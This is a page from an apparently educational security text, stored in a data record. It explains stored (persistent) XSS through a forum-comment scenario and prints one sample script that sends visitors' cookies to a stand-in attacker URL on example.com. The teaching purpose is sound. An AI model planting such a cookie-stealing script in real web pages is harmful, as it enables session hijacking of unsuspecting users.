- pgno: 436
  md: '# # XSS Stored (Persistent)


    Stored XSS, also known as persistent XSS, is more dangerous because the malicious
    script is stored on the server, for example in a database, and is then displayed
    to every user who accesses the affected page. Stored XSS occurs when insecure
    user-supplied data is stored by the web application and then displayed on a web
    page without being properly escaped or filtered. This allows an attacker to inject
    malicious code, such as JavaScript scripts, into a web page, which can compromise
    the security of users accessing it.


    # ## Example of a stored XSS attack :


    Imagine an online forum where users can post comments on different topics. The
    website stores these comments in a database and then displays them on the corresponding
    pages. If the web application does not perform appropriate validation or escaping
    on the comments before displaying them, an attacker could submit a comment containing
    malicious JavaScript code.


    For example, the attacker could submit a comment containing the following code:


    ```

    <script>

    fetch(''https://www.example.com/my_cookies.php?cookie='' + document.cookie);

    </script>

    ```


    When this comment is displayed on the web page, the malicious JavaScript code
    is executed in the browser of each user viewing the page. In this example, the
    JavaScript code sends the user''s cookies to a website controlled by the attacker,
    compromising the confidentiality of the user''s information.'
  merge: -1
  img_proc: true
